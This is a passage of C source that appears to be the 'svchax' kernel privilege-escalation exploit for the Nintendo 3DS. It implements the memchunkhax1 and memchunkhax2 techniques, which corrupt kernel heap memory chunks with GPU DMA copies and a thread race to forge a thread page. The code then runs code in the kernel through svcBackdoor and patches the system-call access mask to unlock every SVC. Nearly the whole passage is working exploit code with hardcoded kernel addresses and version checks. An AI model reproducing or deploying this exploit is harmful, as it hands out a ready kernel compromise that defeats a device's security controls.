   u32 unkown_F4C;
   u32 svc_r4; //0xF50
   u32 svc_r5; //0xF54
   u32 svc_r6; //0xF58
   u32 svc_r7; //0xF5C
   u32 svc_r8; //0xF60
   u32 svc_r9; //0xF64
   u32 svc_sl; //0xF68
   u32 svc_fp; //0xF6C
   u32 svc_sp; //0xF70
   u32 svc_lr; //0xF74
   u32 vfp_regs[0x20]; //0xF78
   u32 unknown_FF8;
   u32 unknown_FFC;
} thread_page_t;

typedef struct
{
   u32 r0;
   u32 r1;
   u32 r2;
   u32 r3;
   u32 r4;
   u32 r5;
   u32 r6;
   u32 r7;
   u32 r8;
   u32 r9;
   u32 r10;
   u32 r11;
   u32 r12;
   u32 sp;
   u32 lr;
   u32 pc;

} regstate_t;
typedef struct
{
   thread_page_t page;
   u32 stack[0x1000];
   regstate_t regs;
   Handle handle;
   u32 kthread_addr;
   Handle lock;
   u32 lock_addr;
   volatile bool ready;
   volatile bool has_7B_access;
   u32 thread_page_va;
   u32 thread_page_kva;
   u32 offset;
   u32 main_thread_page_addr;
   u8 isNew3DS;
} target_thread_vars_t;

static target_thread_vars_t target;

__attribute__((naked))
static u32 get_thread_page(void)
{
   __asm__ volatile(
      "sub r0, sp, #8 \n\t"
      "mov r1, #1 \n\t"
      "mov r2, #0 \n\t"
      "svc	0x2A \n\t"
      "mov r0, r1, LSR#12 \n\t"
      "mov r0, r0, LSL#12 \n\t"
      "bx lr \n\t");
   return 0;
}

static void create_target_page()
{
   u32 version = *(u32*)0x1FF80000;
   int i;
   fake_page_t* fake_pages_current = target.isNew3DS? fake_pages_new : fake_pages_old;
   int fake_pages_count = (target.isNew3DS? sizeof(fake_pages_new): sizeof(fake_pages_old)) / sizeof(*fake_pages_current);

   fake_page_t* fake_page = fake_pages_current;
   for (i = 1; i < fake_pages_count; i++)
   {
      if(version >= fake_pages_current[i].version)
         fake_page = fake_pages_current + i;
   }
   memcpy((u8*)&target.page + sizeof(target.page) - sizeof(fake_page->buffer), fake_page->buffer, sizeof(fake_page->buffer));
   target.page.svc_sp = (target.page.svc_sp & 0xFFF) | (target.thread_page_va & ~0xFFF);
   target.page.usr_lr = target.regs.lr;
   target.page.usr_pc = target.regs.pc;
   target.page.svc_ctl[3] = 0x08000000;
   extern void* __service_ptr;

   if(__service_ptr)
      target.offset = 0xCB8;
   else
      target.offset = 0xC90;

   u32* tpage = (u32*)&target.page;
   u32 sp_offset = target.regs.sp - target.page.usr_sp;
   u32 old_sp_reg = target.page.usr_sp;
   for (i = 0; i < 0x400; i++)
   {
      if (tpage[i] == fake_page->kthread_addr)
         tpage[i] = target.kthread_addr;
      else if (tpage[i] == fake_page->lock_addr)
         tpage[i] = target.lock_addr;

      if((tpage[i] - old_sp_reg) < sizeof(target.stack) ||
         (old_sp_reg - tpage[i]) < sizeof(target.stack))
         tpage[i] += sp_offset;
   }
}
static void dummy_thread_entry(Handle lock)
{
   svcWaitSynchronization(lock, U64_MAX);
   svcExitThread();
}

static Result grant_7B_access(u32* thread_page)
{
   thread_page[0xF44 >> 2] = 0x08000000;
   return 0;
}

__attribute__((optimize(0)))
static void target_thread_entry(void* args)
{
   (void)args;
   Handle tmp_thread;
   static u32 tmp_thread_stack[0x1000];
   Handle tmp_thread_lock;
   svcCreateEvent(&tmp_thread_lock, 1);
   svcClearEvent(tmp_thread_lock);

   svcCreateThread(&tmp_thread, (ThreadFunc)dummy_thread_entry, tmp_thread_lock,
                                   (u32*)&tmp_thread_stack[0x400], 0x30, 0);
   svcSignalEvent(tmp_thread_lock);
   svcWaitSynchronization(tmp_thread, U64_MAX);
   svcCloseHandle(tmp_thread);
   svcCloseHandle(tmp_thread_lock);

   target.thread_page_va = get_thread_page();
   target.regs.r0 = target.lock;
   target.regs.r1 = 0xFFFFFFFF;
   target.regs.r2 = 0xFFFFFFFF;
   target.ready = true;
   __asm__ volatile(
      "mov r2, %0 \n\t"
      "str r3,  [r2 , #0x0C] \n\t"
      "str r4,  [r2 , #0x10] \n\t"
      "str r5,  [r2 , #0x14] \n\t"
      "str r6,  [r2 , #0x18] \n\t"
      "str r7,  [r2 , #0x1C] \n\t"
      "str r8,  [r2 , #0x20] \n\t"
      "str r9,  [r2 , #0x24] \n\t"
      "str r10, [r2 , #0x28] \n\t"
      "str r11, [r2 , #0x2C] \n\t"
      "str r12, [r2 , #0x30] \n\t"
      "str r13, [r2 , #0x34] \n\t"
      "str r14, [r2 , #0x38] \n\t"
      "add r0,  r15, #0x10   \n\t"
      "str r0,  [r2 , #0x3C] \n\t"
      "ldr r0,  [r2 , #0x00] \n\t"
      "ldr r1,  [r2 , #0x04] \n\t"
      "ldr r2,  [r2 , #0x08] \n\t"
      "svc 0x24 \n\t"
      ::"r"(&target.regs):"r0", "r1", "r2");

   if (target.has_7B_access)
      svc_7b((backdoor_fn)grant_7B_access, (void*)target.main_thread_page_addr);

   svcExitThread();
}

static u32 get_first_free_basemem_page()
{
   s64 v1, v2;
   svcGetSystemInfo(&v1, 2, 0);
   svcGetSystemInfo(&v2, 0, 3);

   return 0xE006C000 + *(u32*)0x1FF80040 + *(u32*)0x1FF80044 + *(u32*)0x1FF80048 + v1 - v2
         - (*(u32*)0x1FF80000 <= 0x02310000? 0x1000: 0x0)
         + (target.isNew3DS? 0x1000: 0x0);
}


__attribute__((optimize(0)))
static void do_memchunkhax2(void)
{
   int i;
   u32 tmp;
   target.main_thread_page_addr = get_thread_page();
   aptOpenSession();
   APT_CheckNew3DS(&target.isNew3DS);
   APT_SetAppCpuTimeLimit(5);
   aptCloseSession();

   const u32 dummy_threads_count = 8;
   Handle dummy_thread_handles[8];
   static u8 dummy_thread_stacks[8][0x1000];
   Handle dummy_thread_lock;
   svcCreateEvent(&dummy_thread_lock, 1);
   svcClearEvent(dummy_thread_lock);

   for (i = 0; i < dummy_threads_count; i++)
   {
      svcCreateThread(&dummy_thread_handles[i], (ThreadFunc)dummy_thread_entry, dummy_thread_lock,
                                      (u32*)(&dummy_thread_stacks[i][sizeof(*dummy_thread_stacks) / sizeof(**dummy_thread_stacks)]), 0x30, 0);
   }

   svcCreateEvent(&target.lock, 0);
   svcClearEvent(target.lock);
   register u32 reg_r2 __asm__("r2");
   target.lock_addr = reg_r2 - 0x4;
   target.ready = false;
   target.has_7B_access = false;
   target.thread_page_kva = get_first_free_basemem_page();

   svcCreateThread(&target.handle, (ThreadFunc)target_thread_entry, 0,
                                   &target.stack[sizeof(target.stack) / sizeof(*target.stack)], 0x3F, 0);
   svcDuplicateHandle(&tmp, target.handle);
   svcCloseHandle(tmp);
   target.kthread_addr = reg_r2 - 0x4;

   svcSignalEvent(dummy_thread_lock);
   for (i = 0; i < dummy_threads_count ; i++)
   {
      gfxFlushBuffers();
      svcWaitSynchronization(dummy_thread_handles[i], U64_MAX);
      svcCloseHandle(dummy_thread_handles[i]);
   }
   svcCloseHandle(dummy_thread_lock);

   while (!target.ready)
      svcSleepThread(20000);

   gfxFlushBuffers();

   u32 fragmented_address = 0;

   arbiter = __sync_get_arbiter();

   create_target_page();

   u32 linear_buffer;
   svcControlMemory(&linear_buffer, 0, 0, 0x1000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   u32 linear_size = 0xF000;
   u32 skip_pages = 2;
   alloc_size = ((((linear_size - (skip_pages << 12)) + 0x1000) >> 13) << 12);
   u32 mem_free = osGetMemRegionFree(MEMREGION_APPLICATION);

   u32 fragmented_size = mem_free - linear_size;
   extern u32 __ctru_heap;
   extern u32 __ctru_heap_size;
   fragmented_address = __ctru_heap + __ctru_heap_size;
   u32 linear_address;
   alloc_address = fragmented_address + fragmented_size;
   gfxFlushBuffers();

   svcControlMemory(&linear_address, 0x0, 0x0, linear_size, MEMOP_ALLOC_LINEAR,
                    MEMPERM_READ | MEMPERM_WRITE);

   gfxFlushBuffers();
   if (fragmented_size)
      svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_ALLOC,
                       MEMPERM_READ | MEMPERM_WRITE);

   if (skip_pages)
      svcControlMemory(&tmp, (u32)linear_address, 0x0, (skip_pages << 12), MEMOP_FREE, MEMPERM_DONTCARE);

   for (i = skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   u32 alloc_address_kaddr = osConvertVirtToPhys((void*)linear_address) + 0xC0000000;

   tmp = alloc_address_kaddr;

   gfxFlushBuffers();
   u32 args;
   Handle alloc_thread_handle = 0;
   Handle poll_thread_handle = 0;
   static u8 alloc_thread_stack [0x1000];
   static u8 poll_thread_stack [0x1000];

   gfxFlushBuffers();
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);

   ((u32*)linear_buffer)[0] = 1;
   ((u32*)linear_buffer)[1] = target.thread_page_kva + target.offset;
   ((u32*)linear_buffer)[2] = alloc_address_kaddr + (((alloc_size >> 12) - 3) << 13) + (skip_pages << 12);

   u32 dst_memchunk = linear_address + (((alloc_size >> 12) - 2) << 13) + (skip_pages << 12);
   gfxFlushBuffers();
   lock_thread = true;
   lock_alloc = true;
   alloc_finished = false;
   svcCreateThread(&alloc_thread_handle, alloc_thread, (u32)&args, (u32*)(alloc_thread_stack + 0x1000), 0x3F, 1);
   svcCreateThread(&poll_thread_handle, poll_thread, (u32)&args, (u32*)(poll_thread_stack + 0x1000), 0x18, 1);

   lock_alloc = false;
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   GSPGPU_InvalidateDataCache((void*)dst_memchunk, 16);
   GSPGPU_FlushDataCache((void*)linear_buffer, 16);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   extern Handle gspEvents[GSPGPU_EVENT_MAX];
   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);

   while ((u32) svcArbitrateAddress(arbiter, alloc_address, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);

   GX_TextureCopy((void*)linear_buffer, 0, (void*)dst_memchunk, 0, 16, 8);
   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   gfxFlushBuffers();
   lock_thread = false;
   u32* src;
   u32* dst;

   while (!alloc_finished);
   src = (u32*)((u32)&target.page + 0x1000);
   dst = (u32*)((u32)alloc_address + alloc_size);
   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
   {
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
   }
   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   src = (u32*)((u32)&target.page + 0x1000);
   dst = (u32*)((u32)alloc_address + alloc_size);
   while (dst > (u32*)((u32)alloc_address + alloc_size - 0x200))
   {
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);

      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
      *(--dst) = *(--src);
   }
   GSPGPU_FlushDataCache((void*)((u32)alloc_address + alloc_size - 0x1000), 0x1000);

   lock_thread = false;
   svcWaitSynchronization(alloc_thread_handle, U64_MAX);
   svcWaitSynchronization(poll_thread_handle, U64_MAX);
   svcCloseHandle(poll_thread_handle);
   svcCloseHandle(alloc_thread_handle);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   memcpy(flush_buffer, flush_buffer + 0x8000, 0x8000);
   target.has_7B_access = true;
   svcSignalEvent(target.lock);
   svcWaitSynchronization(target.handle, U64_MAX);
   svcControlMemory(&tmp, alloc_address, 0, alloc_size, MEMOP_FREE, MEMPERM_DONTCARE);
   write_kaddr(alloc_address_kaddr + linear_size - 0x3000 + 0x4, alloc_address_kaddr + linear_size - 0x1000);
   svcCloseHandle(target.handle);
   svcCloseHandle(target.lock);
   svcControlMemory(&tmp, (u32)fragmented_address, 0x0, fragmented_size, MEMOP_FREE, MEMPERM_DONTCARE);
   for (i = 1 + skip_pages; i < (linear_size >> 12) ; i += 2)
      svcControlMemory(&tmp, (u32)linear_address + (i << 12), 0x0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);

   svcControlMemory(&tmp, linear_buffer, 0, 0x1000, MEMOP_FREE, MEMPERM_DONTCARE);
}


static void gspwn(u32 dst, u32 src, u32 size, u8* flush_buffer)
{
   extern Handle gspEvents[GSPGPU_EVENT_MAX];

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
   GSPGPU_InvalidateDataCache((void*)dst, size);
   GSPGPU_FlushDataCache((void*)src, size);
   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);

   svcClearEvent(gspEvents[GSPGPU_EVENT_PPF]);
	GX_TextureCopy((void*)src, 0, (void*)dst, 0, size, 8);
   svcWaitSynchronization(gspEvents[GSPGPU_EVENT_PPF], U64_MAX);

   memcpy(flush_buffer, flush_buffer + 0x4000, 0x4000);
}

/* pseudo-code:
 * if(val2)
 * {
 *    *(u32*)val1 = val2;
 *    *(u32*)(val2 + 8) = (val1 - 4);
 * }
 * else
 *    *(u32*)val1 = 0x0;
 */

// X-X--X-X
// X-XXXX-X

static void memchunkhax1_write_pair(u32 val1, u32 val2)
{
   u32 linear_buffer;
   u8* flush_buffer;
   u32 tmp;

   u32* next_ptr3;
   u32* prev_ptr3;

   u32* next_ptr1;
   u32* prev_ptr6;

   svcControlMemory(&linear_buffer, 0, 0, 0x10000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   flush_buffer = (u8*)(linear_buffer + 0x8000);

   svcControlMemory(&tmp, linear_buffer + 0x1000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x3000, 0, 0x2000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x6000, 0, 0x1000, MEMOP_FREE, 0);

   next_ptr1 = (u32*)(linear_buffer + 0x0004);
   gspwn(linear_buffer + 0x0000, linear_buffer + 0x1000, 16, flush_buffer);

   next_ptr3 = (u32*)(linear_buffer + 0x2004);
   prev_ptr3 = (u32*)(linear_buffer + 0x2008);
   gspwn(linear_buffer + 0x2000, linear_buffer + 0x3000, 16, flush_buffer);

   prev_ptr6 = (u32*)(linear_buffer + 0x5008);
   gspwn(linear_buffer + 0x5000, linear_buffer + 0x6000, 16, flush_buffer);

   *next_ptr1 = *next_ptr3;
   *prev_ptr6 = *prev_ptr3;

   *prev_ptr3 = val1 - 4;
   *next_ptr3 = val2;
   gspwn(linear_buffer + 0x3000, linear_buffer + 0x2000, 16, flush_buffer);
   svcControlMemory(&tmp, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

   gspwn(linear_buffer + 0x1000, linear_buffer + 0x0000, 16, flush_buffer);
   gspwn(linear_buffer + 0x6000, linear_buffer + 0x5000, 16, flush_buffer);

   svcControlMemory(&tmp, linear_buffer + 0x0000, 0, 0x1000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x2000, 0, 0x4000, MEMOP_FREE, 0);
   svcControlMemory(&tmp, linear_buffer + 0x7000, 0, 0x9000, MEMOP_FREE, 0);

}

static void do_memchunkhax1(void)
{
   u32 saved_vram_value = *(u32*)0x1F000008;
   memchunkhax1_write_pair(get_thread_page() + 0xF44, 0x1F000000);
   write_kaddr(0x1F000008, saved_vram_value);
}

static s32 k_enable_all_svcs(void)
{
   __asm__ volatile("cpsid aif");

   u32*  svc_access_control = *(*(u32***)0xFFFF9000 + 0x22) - 0x6;

   svc_access_control[0]=0xFFFFFFFE;
   svc_access_control[1]=0xFFFFFFFF;
   svc_access_control[2]=0xFFFFFFFF;
   svc_access_control[3]=0x3FFFFFFF;

   return 0;
}

void svchax_init(void)
{
   extern void* __service_ptr;

   if (__ctr_svchax)
      return;

   if(__service_ptr)
   {
      u32 kver = *(u32*)0x1FF80000;

      if (kver > 0x02320B00)
         return;
      else if (kver > 0x022E0000)
         do_memchunkhax2();
      else
         do_memchunkhax1();
   }

   svcBackdoor(k_enable_all_svcs);

   __ctr_svchax = 1;

}


